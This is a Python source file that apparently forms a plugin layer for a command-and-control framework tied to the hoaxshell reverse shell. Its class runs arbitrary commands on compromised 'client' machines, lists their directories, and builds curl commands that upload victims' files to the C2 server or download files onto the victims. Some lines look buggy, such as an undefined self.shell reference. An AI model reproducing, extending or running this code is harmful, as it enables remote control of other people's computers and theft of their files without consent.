"""
a place for executing n stuff w/o having to worry about hoaxshell, etc.
also for plugins
"""
import os
import requests
import json

class butane:
    def __init__(self, uid) -> None:
        self.uid = uid

        self.info = json.loads(requests.get("http://localhost/api/data/clients").text)[uid]
        self.port = json.loads(requests.get("http://localhost/api/data/host").text)["port"]

        pass

    def run(self, command):
        """
        run a command (wow!)

            command: any command
        """
        return requests.post("http://localhost/api/shell/run", json={"uid": self.uid, "command": command}).text
        
    def ls(self, pwd):
        """
        list the directory's contents of the clients machine with the pwd given

            pwd: the path to the folder you want to list
        """
        directory = {}
        windows = False
        files = False
        command = ""
        
        if self.shell.info[self.uid]["os"] == "Windows":
            command += "dir"
        else:
            command += "ls"

        if pwd != None or pwd != "current":
            command += " "+pwd

        dta = self.run(command)

        if "Directory: " in dta:
            windows = True
        
        for x in dta.split("\n"):
            print(x)
            if windows:
                if "Directory: " in x:
                    pwd = x.split("Directory:", 1)[-1].strip()
                else:
                    if x.split(" ")[0] == "----": files = True; continue

                    if files:
                        b = [z for z in x]
                        b.pop(0)
                        if "." in ''.join(b):
                            directory[x.strip().split(" ")[-1]] = "file"
                        else:
                            directory[x.strip().split(" ")[-1]] = "folder"
                    
            else: # unix
                pass

        if pwd == None:
            pwd = self.run(command)

        return {"pwd": pwd, "directory": directory}
    
    def upload(self, path, ip=json.loads(open("config.json", "r").read())["ip"]):
        """
        upload a file to be saved onto the c2's uploads folder

            path: folder on client machine
        """
        command = "curl -X POST -H \"Content-Type: multipart/form-data\" -H \"filename: {}\" -H \"Authorization: {}\" -T \"{}\" \"http://{}:{}/\"".format(os.path.basename(path), self.uid, path, ip, self.port-4)

        return self.run(command)
    
    def download(self, path, ip=json.loads(open("config.json", "r").read())["ip"], savepath="./"):
        """
        download a file from the c2's uploads folder to the client's machine

            path: folder on server's machine
        """
        command = "curl -H \"Authorization: {}\" \"http://{}:{}/\" -o {}".format(self.uid, ip, self.port-4, os.path.join(savepath, os.path.basename(path)))

        #shutil.copy(path, "./uploads")

        return self.run(command)